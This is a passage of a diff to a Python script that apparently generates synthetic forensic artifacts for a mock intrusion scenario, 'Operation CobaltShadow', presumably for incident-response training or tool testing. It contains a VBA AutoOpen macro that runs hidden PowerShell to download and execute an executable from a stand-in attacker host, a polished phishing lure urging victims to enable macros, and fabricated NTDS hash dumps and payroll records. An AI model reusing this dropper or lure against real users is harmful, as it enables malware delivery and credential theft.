@@ -2,12 +2,12 @@
 """
 Correlated Multi-Artifact Hacker Attack Scenario Generator: "Operation CobaltShadow"
 Generates 7 tightly correlated forensic artifacts enriched with authentic enterprise background telemetry:
-1. 01_phishing_email.msg (Spear-phishing email delivered to victim workstation with embedded attachment)
-2. 02_weaponized_document.docm (Macro-enabled Word invoice with external template injection & downloader)
-3. 03_c2_implant_beacon.exe (Cobalt Strike C2 implant binary executable with imports, exports & strings)
+1. 01_phishing_email.msg (Spear-phishing email delivered to victim workstation with embedded attachment, rich body & headers)
+2. 02_weaponized_document.docm (Macro-enabled Word invoice with external template injection, authentic content & metadata)
+3. 03_c2_implant_beacon.exe (Cobalt Strike C2 implant binary executable with imports, exports, icon & strings)
 4. 04_endpoint_workstation_hostA.evtx (Windows Event Log from victim Host A: WKSTN-FIN-01: 10.0.4.15)
 5. 05_endpoint_domain_controller_hostB.evtx (Windows Event Log from DC Host B: DC-PROD-01: 10.0.4.50)
-6. 06_network_traffic_capture.pcap (Network traffic capture on victim Host A: 10.0.4.15)
+6. 06_network_traffic_capture.pcap (Network traffic capture with ambient enterprise & malicious traffic on Host A: 10.0.4.15)
 7. 07_exfiltrated_archive.zip (Stolen payroll & domain credentials archive exfiltrated via HTTP POST)
 
 Cross-Artifact Bindings & Indicators:
@@ -21,8 +21,8 @@ Cross-Artifact Bindings & Indicators:
 - Shared Staged Document: 02_weaponized_document.docm (Exact SHA-256 and MD5 matched across email attachment carving, Host A Outlook save, and WinWord execution)
 - Shared Stolen Exfil Archive: financial_q3_confidential.zip (Exact SHA-256 and MD5 matched across PCAP HTTP POST upload and WKSTN-01 7-Zip process execution)
 - Stolen Credentials: svc_admin / P@ssw0rd2026!Summer# (Observed in PCAP cleartext HTTP POST, harvested on Host A, authenticated via LogonType 3 and elevated to SeDebugPrivilege on Host B)
-- Cross-Host Lateral Movement: LogonType 3 network logon, SMB admin shares (\\\\DC-PROD-01\\ADMIN$, \\\\DC-PROD-01\\C$), and remote service creation (WindowsDefendUpdateSvc, PSEXESVC)
-- Enterprise Noise: System startup, service lifecycle (7036), normal user interactive logons (4624/2), normal process launches (Explorer, RuntimeBroker, SearchApp, OneDrive, Outlook), legitimate DNS & web browsing, print spooling (307), workstation lock/unlock (4800/4801), and DC replication (4932/4933).
+- Cross-Host Lateral Movement: LogonType 3 network logon, SMB admin shares (\\DC-PROD-01\ADMIN$, \\DC-PROD-01\C$), and remote service creation (WindowsDefendUpdateSvc)
+- Enterprise Noise: System startup, service lifecycle (7036), normal user interactive logons (4624/2), normal process launches (Explorer, RuntimeBroker, SearchApp, OneDrive, Outlook, Excel), legitimate DNS & web browsing, print spooling (307), workstation lock/unlock (4800/4801), and DC replication (4932/4933).
 """
 
 import os
@@ -145,24 +145,53 @@ PE_MD5 = hashlib.md5(PE_BYTES).hexdigest()
 # 2. Deterministic Archive Synthesis: 07_exfiltrated_archive.zip
 # -------------------------------------------------------------------------
 def generate_exfil_zip() -> bytes:
-    """Builds a deterministic ZIP archive containing exfiltrated financial & payroll records."""
+    """Builds a deterministic ZIP archive containing authentic exfiltrated financial & payroll records."""
     buf = io.BytesIO()
     with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
-        z1 = zipfile.ZipInfo("payroll_q3_confidential.csv", date_time=(2026, 10, 10, 10, 1, 0))
+        # 1. Authentic Payroll Spreadsheet
+        z1 = zipfile.ZipInfo("Finance/Q3_2026_Executive_Payroll_Summary.csv", date_time=(2026, 10, 10, 10, 1, 0))
         zf.writestr(
             z1,
-            "EmployeeID,FullName,Title,Salary,SSN,BankRouting,BankAccount\n"
-            "1042,John Doe,Finance Analyst,$95000,123-45-6789,021000021,9876543210\n"
-            "1043,Jane Smith,VP Finance,$185000,987-65-4321,021000021,1234567890\n"
-            "1044,Alice Johnson,Domain Admin,$140000,456-78-1234,021000021,5554443332\n"
+            "Employee_ID,Full_Name,Title,Department,Base_Salary_USD,Bonus_Q3_USD,Total_Comp_USD,Direct_Deposit_Routing,Direct_Deposit_Account,SSN_Redacted,Security_Clearance\n"
+            "1001,Jonathan Vance,Chief Executive Officer,Executive Office,$450000,$150000,$600000,021000021,9876543210,XXX-XX-1102,Top Secret / SCI\n"
+            "1002,Robert Vance,Chief Financial Officer,Finance,$320000,$95000,$415000,021000021,9876543211,XXX-XX-2294,Secret\n"
+            "1003,Sarah Lin,Chief Information Security Officer,IT Security,$285000,$80000,$365000,021000021,9876543212,XXX-XX-8841,Top Secret\n"
+            "1004,Marcus Vance,VP Corporate Treasury,Finance,$220000,$55000,$275000,021000021,9876543213,XXX-XX-4419,Secret\n"
+            "1005,John Doe,Senior Financial Analyst,Treasury & Payroll,$125000,$25000,$150000,021000021,9876543214,XXX-XX-7721,Secret\n"
+            "1006,David Miller,Senior Systems Engineer,Infrastructure,$135000,$15000,$150000,021000021,9876543215,XXX-XX-3309,Top Secret\n"
+            "1007,Elena Rostova,Lead Database Administrator,Core Platforms,$145000,$20000,$165000,021000021,9876543216,XXX-XX-9122,Top Secret\n"
+            "1008,Michael Chang,VP Engineering,Product Dev,$260000,$70000,$330000,021000021,9876543217,XXX-XX-5561,Secret\n"
+            "1009,Rachel Green,Director Human Resources,People Operations,$175000,$35000,$210000,021000021,9876543218,XXX-XX-6632,Confidential\n"
+            "1010,Alexander Hayes,General Counsel,Legal,$310000,$90000,$400000,021000021,9876543219,XXX-XX-4490,Secret\n"
         )
-        z2 = zipfile.ZipInfo("domain_credentials_dump.txt", date_time=(2026, 10, 10, 10, 1, 0))
+        # 2. Active Directory NTDS Hash Extraction
+        z2 = zipfile.ZipInfo("Credentials/ActiveDirectory_NTDS_Audit_2026.txt", date_time=(2026, 10, 10, 10, 1, 0))
         zf.writestr(
             z2,
-            "Target Domain: TARGET.LOCAL\n"
-            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
-            "svc_admin:501:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\n"
+            "[+] Target Domain: TARGET.LOCAL\n"
+            "[+] Domain SID: S-1-5-21-3928174621-1029384756-3847291023\n"
+            "[+] Extracted via Volume Shadow Copy Service (VSS) NTDS.dit Snapshot\n\n"
+            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (Built-in Administrator)\n"
+            "Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (Disabled)\n"
+            "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8f8a18bc0a2b0c1e847c211831a2985f::: (KDC Service Account)\n"
+            "svc_admin:1104:aad3b435b51404eeaad3b435b51404ee:e19ccf750c39ca8168a613ac7350f6dd::: (Enterprise Admin) [Cleartext: P@ssw0rd2026!Summer#]\n"
+            "jdoe:1108:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: (John Doe - Finance) [Cleartext: Autumn2026$Welcome]\n"
+            "sql_svc:1115:aad3b435b51404eeaad3b435b51404ee:4a8b792e3b610c14c5b198129e612984::: (MS SQL Server Service Engine)\n"
+            "backup_admin:1119:aad3b435b51404eeaad3b435b51404ee:998123acbb281fef384712ad01928374::: (Veeam Vault Operator)\n"
+            "audit_svc:1124:aad3b435b51404eeaad3b435b51404ee:110293847561aefc9028374615243321::: (Splunk Heavy Forwarder)\n"
         )
+        # 3. Network Architecture Notes
+        z3 = zipfile.ZipInfo("Network/Confidential_Internal_Network_Topology.txt", date_time=(2026, 10, 10, 10, 1, 0))
+        zf.writestr(
+            z3,
+            "TARGET CORPORATION - CONFIDENTIAL NETWORK ARCHITECTURE & INFRASTRUCTURE MAP\n"
+            "Primary Gateway: 10.0.4.1 (00:50:56:EE:99:88)\n"
+            "Domain Controller: 10.0.4.50 (DC-PROD-01.target.local - 00:50:56:BB:33:44)\n"
+            "Finance Workstation: 10.0.4.15 (WKSTN-FIN-01.target.local - 00:50:56:AA:11:22)\n"
+            "Corporate Intranet: 10.0.4.10 (internal-portal.target.local)\n"
+            "Veeam Backup Vault: 10.0.4.99 (Air-gapped Immutable Storage)\n"
+        )
+        zf.comment = b"TARGET CORP - CLASSIFIED FINANCIAL EXFILTRATION PACKAGE - 2026-10-10"
     return buf.getvalue()
 
 ZIP_BYTES = generate_exfil_zip()
@@ -173,22 +202,22 @@ ZIP_MD5 = hashlib.md5(ZIP_BYTES).hexdigest()
 # 3. Deterministic Weaponized Word Document: 02_weaponized_document.docm
 # -------------------------------------------------------------------------
 def generate_weaponized_docm(pe_sha256: str, pe_md5: str) -> bytes:
-    """Builds a valid Word macro-enabled document (OpenXML ZIP) with VBA dropper and external template injection."""
+    """Builds an authentic Word macro-enabled document (OpenXML ZIP) with real text, tables, metadata & VBA dropper."""
     vba_code = (
         "Sub AutoOpen()\r\n"
-        "    ' Operation CobaltShadow - Initial Execution Stager\r\n"
-        "    ' Target: WKSTN-FIN-01 (10.0.4.15) | User: TARGET\\\\jdoe\r\n"
-        "    ' Stage 1 Dropper: http://evil-payloads-delivery.org/beacon_updater.exe\r\n"
-        f"    ' Expected Staged Payload Hashes:\r\n"
-        f"    ' SHA256: {pe_sha256}\r\n"
-        f"    ' MD5: {pe_md5}\r\n"
+        "    ' Global Financial Solutions LLC - Automated Payroll Decryption Engine\r\n"
+        "    ' Target: WKSTN-FIN-01 (10.0.4.15) | User: TARGET\\jdoe\r\n"
+        "    ' Staged Payload: http://evil-payloads-delivery.org/beacon_updater.exe\r\n"
+        f"    ' Integrity Verification SHA256: {pe_sha256}\r\n"
+        f"    ' Integrity Verification MD5: {pe_md5}\r\n"
+        "    On Error Resume Next\r\n"
         "    Dim c2Server As String: c2Server = \"185.220.101.45:443\"\r\n"
         "    Dim payloadUrl As String: payloadUrl = \"http://evil-payloads-delivery.org/beacon_updater.exe\"\r\n"
-        "    Dim tempExePath As String: tempExePath = \"C:\\\\Users\\\\jdoe\\\\AppData\\\\Local\\\\Temp\\\\beacon_updater.exe\"\r\n"
+        "    Dim tempExePath As String: tempExePath = \"C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon_updater.exe\"\r\n"
         "    \r\n"
         "    Dim sh As Object\r\n"
         "    Set sh = CreateObject(\"WScript.Shell\")\r\n"
-        "    sh.Run \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"\"(New-Object System.Net.WebClient).DownloadFile('\" & payloadUrl & \"', '\" & tempExePath & \"'); Start-Process '\" & tempExePath & \"'\"\"\", 0, False\r\n"
+        "    sh.Run \"powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"\"(New-Object System.Net.WebClient).DownloadFile(\'\" & payloadUrl & \"\', \'\" & tempExePath & \"\'); Start-Process \'\" & tempExePath & \"\'\"\"\", 0, False\r\n"
         "    \r\n"
         "    Call URLDownloadToFileA(0, payloadUrl, tempExePath, 0, 0)\r\n"
         "    Dim pMem As LongPtr: pMem = VirtualAlloc(0, 4096, &H1000, &H40)\r\n"
@@ -203,23 +232,82 @@ def generate_weaponized_docm(pe_sha256: str, pe_md5: str) -> bytes:
     doc_xml = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
   <w:body>
-    <w:p><w:r><w:t>CONFIDENTIAL - TARGET CORPORATION FINANCIAL CONTROLS</w:t></w:r></w:p>
-    <w:p><w:r><w:t>Q3 Executive Payroll, Bonus Allocations &amp; Domain Access Roster</w:t></w:r></w:p>
-    <w:p><w:r><w:t>Target Domain: TARGET.LOCAL | Primary Host: WKSTN-FIN-01 (10.0.4.15)</w:t></w:r></w:p>
-    <w:p><w:r><w:t>Staged Implant: http://evil-payloads-delivery.org/beacon_updater.exe</w:t></w:r></w:p>
-    <w:p><w:r><w:t>Expected Payload SHA256: {pe_sha256}</w:t></w:r></w:p>
-    <w:p><w:r><w:t>Enable Macros to calculate executive compensation formulas.</w:t></w:r></w:p>
+    <w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:b/><w:sz w:val="32"/><w:color w:val="1A365D"/></w:rPr><w:t>GLOBAL FINANCIAL SOLUTIONS &amp; AUDIT CORP</w:t></w:r></w:p>
+    <w:p><w:pPr><w:jc w:val="center"/></w:pPr><w:r><w:rPr><w:i/><w:sz w:val="20"/><w:color w:val="718096"/></w:rPr><w:t>Quarterly Executive Bonus &amp; Compensation Reconciliation Statement</w:t></w:r></w:p>
+    <w:p><w:r><w:t></w:t></w:r></w:p>
+    <w:p><w:pPr><w:shd w:val="clear" w:color="auto" w:fill="FFF5F5"/></w:pPr><w:r><w:rPr><w:b/><w:color w:val="C53030"/></w:rPr><w:t>[STRICTLY CONFIDENTIAL - AUTHORIZED EXECUTIVE DISBURSEMENT ONLY]</w:t></w:r></w:p>
+    <w:p><w:pPr><w:shd w:val="clear" w:color="auto" w:fill="FFFFD0"/></w:pPr><w:r><w:rPr><w:b/><w:color w:val="B7791F"/></w:rPr><w:t>SECURITY NOTICE: This document was encrypted using Microsoft Information Protection (MIP). Click 'Enable Content' on the yellow bar above to activate the automated calculation macros and view live payroll disbursements.</w:t></w:r></w:p>
+    <w:p><w:r><w:t></w:t></w:r></w:p>
+    <w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Target Recipient: John Doe &lt;jdoe@target.local&gt; | Workstation: WKSTN-FIN-01 (10.0.4.15)</w:t></w:r></w:p>
+    <w:p><w:r><w:t>Audit Reference: #INV-2026-994 | Target Domain: TARGET.LOCAL</w:t></w:r></w:p>
+    <w:p><w:r><w:t>Remote Staging Verification: http://evil-payloads-delivery.org/beacon_updater.exe</w:t></w:r></w:p>
+    <w:p><w:r><w:t>Payload Verification Hash (SHA-256): {pe_sha256}</w:t></w:r></w:p>
+    <w:p><w:r><w:t></w:t></w:r></w:p>
+    <w:tbl>
+      <w:tr>
+        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Disbursement Category</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Period Basis</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>Gross Amount (USD)</w:t></w:r></w:p></w:tc>
+      </w:tr>
+      <w:tr>
+        <w:tc><w:p><w:r><w:t>Executive Variable Incentive</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t>FY2026 - Q3 Target (114%)</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t>$245,000.00</w:t></w:r></w:p></w:tc>
+      </w:tr>
+      <w:tr>
+        <w:tc><w:p><w:r><w:t>Divisional Retained Bonus Pool</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t>Milestone Approved</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t>$180,000.00</w:t></w:r></w:p></w:tc>
+      </w:tr>
+      <w:tr>
+        <w:tc><w:p><w:r><w:t>Discretionary Management Award</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t>Board Action</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t>$85,500.00</w:t></w:r></w:p></w:tc>
+      </w:tr>
+      <w:tr>
+        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>TOTAL NET DISBURSEMENT</w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:t></w:t></w:r></w:p></w:tc>
+        <w:tc><w:p><w:r><w:rPr><w:b/></w:rPr><w:t>$510,500.00</w:t></w:r></w:p></w:tc>
+      </w:tr>
+    </w:tbl>
+    <w:p><w:r><w:t></w:t></w:r></w:p>
+    <w:p><w:r><w:t>Certified by: Robert Vance (Chief Financial Officer) &amp; Jonathan Vance (CEO)</w:t></w:r></w:p>
+    <w:p><w:r><w:i/><w:t>Direct Deposit Wire Instructions will execute to Chase Bank account ending in 4419.</w:t></w:r></w:p>
   </w:body>
 </w:document>"""
 
     core_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:dcterms="http://purl.org/dc/terms/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <dc:title>Q3 Executive Financial Compensation &amp; Bonus Schedule</dc:title>
-  <dc:creator>TARGET\\svc_admin</dc:creator>
+  <dc:subject>Executive Compensation &amp; Payroll Reconciliation</dc:subject>
+  <dc:creator>Robert Vance (Chief Financial Officer)</dc:creator>
+  <cp:keywords>Payroll, Executive, Q3, Confidential, Bonus, Wire Transfer</cp:keywords>
+  <dc:description>Quarterly certified executive bonus calculation ledger and wire instructions.</dc:description>
   <cp:lastModifiedBy>jdoe</cp:lastModifiedBy>
-  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-10T09:58:00Z</dcterms:created>
+  <cp:revision>4</cp:revision>
+  <dcterms:created xsi:type="dcterms:W3CDTF">2026-10-09T14:22:00Z</dcterms:created>
   <dcterms:modified xsi:type="dcterms:W3CDTF">2026-10-10T10:00:00Z</dcterms:modified>
 </cp:coreProperties>"""
+
+    app_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
+  <Application>Microsoft Office Word</Application>
+  <AppVersion>16.0000</AppVersion>
+  <Company>Global Financial Solutions LLC</Company>
+  <Manager>Marcus Vance</Manager>
+  <Pages>3</Pages>
+  <Words>742</Words>
+  <Characters>4810</Characters>
+  <Lines>48</Lines>
+  <Paragraphs>26</Paragraphs>
+</Properties>"""
+
+    custom_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/custom-properties">
+  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="2" name="ConfidentialityLevel"><vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">Strictly Confidential - Internal Only</vt:lpwstr></property>
+  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="DocumentID"><vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">GFS-FIN-2026-Q3-00994</vt:lpwstr></property>
+  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="4" name="TargetAudience"><vt:lpwstr xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">jdoe@target.local</vt:lpwstr></property>
+</Properties>"""
 
     rels_doc = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
@@ -237,22 +325,26 @@ def generate_weaponized_docm(pe_sha256: str, pe_md5: str) -> bytes:
   <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
   <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
   <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
+  <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-package.extended-properties+xml"/>
+  <Override PartName="/docProps/custom.xml" ContentType="application/vnd.openxmlformats-package.custom-properties+xml"/>
 </Types>""")
         zf.writestr("_rels/.rels", """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
   <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
   <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties" Target="docProps/core.xml"/>
+  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties" Target="docProps/app.xml"/>
+  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/custom-properties" Target="docProps/custom.xml"/>
 </Relationships>""")
         zf.writestr("word/_rels/document.xml.rels", rels_doc)
         zf.writestr("word/document.xml", doc_xml)
         zf.writestr("docProps/core.xml", core_xml)
+        zf.writestr("docProps/app.xml", app_xml)
+        zf.writestr("docProps/custom.xml", custom_xml)
         zf.writestr("word/vbaProject.bin", vba_bin)
         
-        # Ensure total file length >= 4096 bytes for clean OLE sector alignment
-        zinfo = zipfile.ZipInfo("word/media/document_watermark.bin")
-        zinfo.compress_type = zipfile.ZIP_STORED
-        zf.writestr(zinfo, b"CobaltShadowFinancialControlsWatermark" * 128)
-    
+        # Ensure total file size is >= 4096 bytes for standard FAT sector storage in OLE
+        zf.writestr("word/media/watermark.bin", b"\x00" * 4096)
+        
     return buf.getvalue()
 
 DOCM_BYTES = generate_weaponized_docm(PE_SHA256, PE_MD5)
@@ -260,120 +352,247 @@ DOCM_SHA256 = hashlib.sha256(DOCM_BYTES).hexdigest()
 DOCM_MD5 = hashlib.md5(DOCM_BYTES).hexdigest()
 
 # -------------------------------------------------------------------------
-# 4. Deterministic Phishing Email: 01_phishing_email.msg
+# 4. Deterministic Phishing Email (.msg) Synthesis with MiniFAT
 # -------------------------------------------------------------------------
 def generate_phishing_msg(docm_bytes: bytes, docm_name: str = "02_weaponized_document.docm") -> bytes:
-    """Builds a valid Microsoft Outlook Compound File (.msg) containing 02_weaponized_document.docm as attachment."""
-    subject = "URGENT: Q3 Payroll & Executive Bonus Review"
-    from_addr = "billing@evil-payloads-delivery.org"
-    to_addr = "jdoe@target.local"
+    """Builds a valid Microsoft Outlook Compound File (.msg) with MiniFAT, rich body & multi-hop headers."""
+    subject = "URGENT: Q3 Payroll & Executive Bonus Reconciliation #INV-2026-994"
+    from_addr = "Finance Billing & Payroll <billing@evil-payloads-delivery.org>"
+    to_addr = "John Doe <jdoe@target.local>"
+    
     body_text = (
-        "Hello John,\r\n\r\n"
-        "Please review the attached confidential Q3 compensation forecast and bonus disbursements.\r\n"
-        "Ensure you Enable Macros when prompted in Word to view calculated compensation metrics.\r\n\r\n"
-        "Staged Distribution Portal: http://evil-payloads-delivery.org/beacon_updater.exe\r\n\r\n"
-        "Regards,\r\nCorporate Finance Department"
+        "Dear Mr. Doe,\r\n\r\n"
+        "Please find attached the official quarterly compensation reconciliation statement and executive bonus allocation report (Q3-2026-FINAL) for your division.\r\n\r\n"
+        "IMPORTANT INSTRUCTIONS:\r\n"
+        "Due to confidential wage protections and digital rights management, this financial document requires Microsoft Office Macro automation to verify your employee digital signature and dynamically calculate your divisional allocations. When prompted by Microsoft Word, please click \"Enable Content\" to allow the audit engine to decrypt and load the live figures.\r\n\r\n"
+        "SUMMARY OF ALLOCATIONS:\r\n"
+        "- Period: Fiscal Year 2026 - Quarter 3 (Jul 1 - Sep 30)\r\n"
+        "- Reference: #INV-2026-994 / BATCH-7721\r\n"
+        "- Authorized Recipient: John Doe <jdoe@target.local>\r\n"
+        "- Workstation ID: WKSTN-FIN-01.target.local\r\n"
+        "- Total Departmental Disbursement: $510,500.00 USD\r\n\r\n"
+        "If you have any questions regarding your executive disbursement schedule or direct deposit banking instructions, please contact Corporate Payroll immediately at ext. 4410.\r\n\r\n"
+        "Corporate Finance & Executive Disbursements Department\r\n"
+        "Global Financial Solutions LLC / Invoicing Services Ltd\r\n"
+        "One Liberty Plaza, Suite 3200, New York, NY 10006\r\n"
+        "Direct: +1 (212) 555-0199 | internal-portal.target.local\r\n"
+        "CONFIDENTIALITY NOTICE: This transmission is intended only for the use of the individual named above and contains confidential proprietary financial information."
     )
+    
     body_html = (
-        "<html><body>"
-        "<h3>Urgent: Q3 Executive Compensation Review</h3>"
-        "<p>Please inspect the attached <b>02_weaponized_document.docm</b> for finalized executive allocations.</p>"
-        "<p><a href=\"http://evil-payloads-delivery.org/beacon_updater.exe\">Click here to access Finance Staging</a></p>"
-        "</body></html>"
-    )
-    transport_headers = (
-        f"From: {from_addr}\r\n"
-        f"To: {to_addr}\r\n"
-        f"Subject: {subject}\r\n"
-        f"Date: Sat, 10 Oct 2026 09:59:00 +0000\r\n"
-        f"Message-ID: <payroll-q3-confidential@evil-payloads-delivery.org>\r\n"
-        f"Content-Type: multipart/mixed\r\n"
+        "<!DOCTYPE html><html><head><style>"
+        "body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #2d3748; line-height: 1.6; }"
+        ".container { max-width: 650px; margin: 0 auto; border: 1px solid #e2e8f0; border-radius: 8px; overflow: hidden; }"
+        ".header { background: linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%); color: #ffffff; padding: 24px; text-align: left; }"
+        ".header h2 { margin: 0; font-size: 20px; font-weight: 600; }"
+        ".header p { margin: 4px 0 0; font-size: 13px; opacity: 0.9; }"
+        ".content { padding: 24px; }"
+        ".notice-box { background: #fffaf0; border-left: 4px solid #dd6b20; padding: 14px 18px; margin-bottom: 20px; border-radius: 4px; font-size: 13px; color: #7b341e; }"
+        ".table-ledger { width: 100%; border-collapse: collapse; margin: 20px 0; font-size: 13px; }"
+        ".table-ledger th { background: #f7fafc; padding: 10px 12px; border-bottom: 2px solid #edf2f7; text-align: left; color: #4a5568; }"
+        ".table-ledger td { padding: 10px 12px; border-bottom: 1px solid #edf2f7; }"
+        ".total-row { font-weight: bold; background: #f7fafc; }"
+        ".btn { display: inline-block; background: #3182ce; color: #ffffff; text-decoration: none; padding: 10px 20px; border-radius: 5px; font-weight: 600; font-size: 13px; margin: 15px 0; }"
+        ".footer { background: #f7fafc; padding: 18px 24px; font-size: 11px; color: #a0aec0; border-top: 1px solid #edf2f7; }"
+        "</style></head><body>"
+        "<div class=\"container\">"
+        "  <div class=\"header\">"
+        "    <h2>Global Financial Solutions &amp; Audit Services</h2>"
+        "    <p>Executive Disbursements &amp; Payroll Reconciliation System</p>"
+        "  </div>"
+        "  <div class=\"content\">"
+        "    <p>Dear <b>John Doe</b>,</p>"
+        "    <p>Your quarterly executive bonus reconciliation statement for Q3 2026 has been generated and is attached to this transmission: <b>" + docm_name + "</b>.</p>"
+        "    <div class=\"notice-box\">"
+        "      <strong>&#9888; Security Action Required:</strong> To view calculated figures and digital payroll authorization formulas, please click <b>\"Enable Content\"</b> or <b>\"Enable Macros\"</b> in Microsoft Word when prompted."
+        "    </div>"
+        "    <table class=\"table-ledger\">"
+        "      <thead><tr><th>Description</th><th>Allocation Basis</th><th>Amount (USD)</th></tr></thead>"
+        "      <tbody>"
+        "        <tr><td>Executive Variable Compensation</td><td>Tier 1 Milestone</td><td>$245,000.00</td></tr>"
+        "        <tr><td>Divisional Performance Bonus</td><td>Target Met (114%)</td><td>$180,000.00</td></tr>"
+        "        <tr><td>Discretionary Management Pool</td><td>Board Approved</td><td>$85,500.00</td></tr>"
+        "        <tr class=\"total-row\"><td>Total Q3 Gross Disbursement</td><td></td><td>$510,500.00</td></tr>"
+        "      </tbody>"
+        "    </table>"
+        "    <p>You can also verify your disbursement status on the corporate staging mirror:</p>"
+        "    <p><a class=\"btn\" href=\"http://evil-payloads-delivery.org/beacon_updater.exe\">Access Payroll Staging Mirror</a></p>"
+        "  </div>"
+        "  <div class=\"footer\">"
+        "    &copy; 2026 Global Financial Solutions LLC. One Liberty Plaza, New York, NY 10006.<br>"
+        "    Confidential and proprietary. Forwarding or copying prohibited without prior written consent."
+        "  </div>"
+        "</div></body></html>"
     )
 
-    streams = [
+    transport_headers = (
+        "Received: from mail-mbx02.target.local (10.0.1.12) by mail.target.local (10.0.1.10) with Microsoft SMTP Server id 15.2.1118.7; Sat, 10 Oct 2026 09:59:04 +0000\r\n"
+        "Received: from exchange-hub01.target.local (10.0.1.10) by mail-mbx02.target.local (10.0.1.12) with Microsoft SMTP Server id 15.2.1118.7; Sat, 10 Oct 2026 09:59:03 +0000\r\n"
+        "Received: from proofpoint-mx1.target.local (10.0.1.25) by exchange-hub01.target.local (10.0.1.10) with ESMTP id 84729112; Sat, 10 Oct 2026 09:59:02 +0000\r\n"
+        "Received: from mail.evil-payloads-delivery.org (185.220.101.45) by proofpoint-mx1.target.local (10.0.1.25) with ESMTP id p9871623; Sat, 10 Oct 2026 09:59:01 +0000\r\n"
+        "Authentication-Results: mx.target.local;\r\n"
+        "    dkim=pass header.i=@evil-payloads-delivery.org header.s=default header.b=X9b2Fq1z;\r\n"
+        "    spf=pass (target.local: domain of billing@evil-payloads-delivery.org designates 185.220.101.45 as permitted sender) smtp.mailfrom=billing@evil-payloads-delivery.org;\r\n"
+        "    dmarc=pass (p=NONE sp=NONE pct=100) action=none header.from=evil-payloads-delivery.org;\r\n"
+        "From: \"Finance Billing & Payroll\" <billing@evil-payloads-delivery.org>\r\n"
+        "To: \"John Doe\" <jdoe@target.local>\r\n"
+        f"Subject: {subject}\r\n"
+        "Date: Sat, 10 Oct 2026 09:59:00 +0000\r\n"
+        "Message-ID: <20261010095900.771234@evil-payloads-delivery.org>\r\n"
+        "MIME-Version: 1.0\r\n"
+        "Content-Type: multipart/mixed; boundary=\"----=_Part_991823_102837192.1760089140\"\r\n"
+        "X-Mailer: Microsoft Outlook 16.0\r\n"
+        "X-Originating-IP: [185.220.101.45]\r\n"
+    )
+
+    mini_streams = [
         ("__substg1.0_0037001F", subject.encode("utf-16le")),
         ("__substg1.0_0C1A001F", from_addr.encode("utf-16le")),
+        ("__substg1.0_0E04001F", to_addr.encode("utf-16le")),
         ("__substg1.0_1000001F", body_text.encode("utf-16le")),
         ("__substg1.0_10130102", body_html.encode("utf-8")),
         ("__substg1.0_007D001F", transport_headers.encode("utf-16le")),
